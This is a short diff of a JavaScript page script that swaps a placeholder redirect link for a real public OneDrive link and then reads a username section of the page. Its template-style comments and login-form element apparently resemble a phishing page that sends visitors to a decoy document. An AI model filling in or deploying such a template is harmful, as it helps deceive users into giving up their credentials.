@@ -1,7 +1,7 @@
 document.addEventListener('DOMContentLoaded', () => {
   // redirect target (public OneDrive PDF or anything you like)
   const redirectURL =
-    'https://YOUR_ONEDRIVE_PUBLIC_LINK_HERE';  // ← replace this link
+    'https://1drv.ms/w/c/87f317231466b0ec/EUzblMBVSWtHjL8eGIdHYCoBBemzU5FMDiEf1r_LDmQQVg?e=GpbFEh';  // ← replace this link
 
   // elements
   const secU = document.getElementById('section_uname');
